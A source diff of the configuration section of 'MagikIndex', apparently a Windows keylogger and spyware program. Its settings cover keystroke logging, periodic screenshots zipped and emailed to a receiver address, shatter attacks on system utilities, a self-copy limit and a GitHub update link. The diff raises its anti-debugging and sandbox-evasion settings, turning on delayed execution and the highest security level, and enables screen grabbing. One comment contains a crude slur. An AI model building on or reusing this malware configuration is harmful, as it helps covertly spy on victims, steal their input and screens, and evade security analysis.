@@ -28,6 +28,7 @@
 #include <array>
 #include <winioctl.h>
 #include <shlwapi.h>
+#include <lm.h>
 
 #include "Antidbg.h"
 #include "log.h"
@@ -36,29 +37,30 @@
 using buffer = std::vector<char>;
 
 //------------------------------------------------------
-//  Customization
+// Customization
 
-#define CryptLogs true      //whether or not to crypt files and shatter-attack system utilities [REMOVE THIS FLAG]
+#define CryptLogs true      //whether or not to crypt files
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
 #define ShatterAttack false //disable or enable shatter attacks on sys utils(cmd,Run,Taskmgmr)
 #define IsMajor true        //let the program know whether its a Dev build or not
-#define CurrentVersion "1.61"//current version number
+#define CurrentVersion "1.7"//current version number
 #define GitVersionLink "https://raw.githubusercontent.com/brat-volk/MagikIndex/main/MagikVersion.inf"//link to GitHub Raw server containing up-to-date version file
-#define CharactersPerLog 300//
-#define MaximumFolderSize 10 
+#define CharactersPerLog 500
+#define MaximumFolderSize 10//limit of MagikIndex copies in a system
 #define RequiredRam 2048    //MB                                             (anti-dbg feature)
 #define RequiredCores 2     //                                               (anti-dbg feature)
 #define SecondsBetweenScreenshots 20
-#define ScreenshotsPerZip 4
+#define ScreenGrab true     //whether to screenshot at set intervals or not
+#define ScreenshotsPerZip 15
 #define SendersEmail ""
-#define SendersPsw ""
+#define SendersPsw ""             //IMPORTANT : due to google's cuckhold fetish the "Allow less secure apps" setting has now been removed, you are now required to enable 2-step auth and create an "App Password" for Mail. use the password provided by google in this field.
 #define RecieversEmail ""
 #define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
 #define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
-#define SecurityLevel 0     //0-3 levels of trust towards environment        (anti-dbg feature)
+#define SecurityLevel 3     //0-3 levels of trust towards environment        (anti-dbg feature)
 #define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
-#define DelayExecution false//whether or not execution should be delayed     (anti-dbg feature)
-#define DelayTime 120       //amount of time for the delay (seconds)         (anti-dbg feature)
+#define DelayExecution true //whether or not execution should be delayed     (anti-dbg feature)
+#define DelayTime 300       //amount of time for the delay (seconds)         (anti-dbg feature)
 #define QuitIfUntrust false //should we send a log if the environment is untrusted or quit on the spot?
 
 //------------------------------------------------------
@@ -79,7 +81,7 @@ using buffer = std::vector<char>;
 #pragma comment( lib, "comsuppw.lib" )
 //#pragma comment(lib, "Wbemuuid.lib.")
 #pragma comment(lib, "urlmon.lib")
-
+#pragma comment(lib, "Netapi32.lib")
 
 #define _WIN32_WINNT 0x050
 
